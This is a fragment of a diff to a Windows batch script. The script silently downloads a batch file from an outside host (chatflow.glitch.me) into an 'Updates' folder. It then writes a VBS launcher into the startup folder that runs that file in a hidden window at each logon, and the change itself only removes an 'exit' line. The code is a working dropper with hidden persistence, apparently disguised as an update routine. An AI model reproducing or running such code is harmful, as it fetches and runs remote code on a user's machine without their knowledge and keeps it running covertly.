@@ -46,6 +46,5 @@ curl -s http://chatflow.glitch.me/uploads/starter.bat > "%updates_folder%\starte
     echo.CreateObject^("Wscript.Shell"^).Run "C:\Updates\starter.bat", 0, True
 ) > "%startup_folder%\starter.vbs"
 
-exit
 
 pause
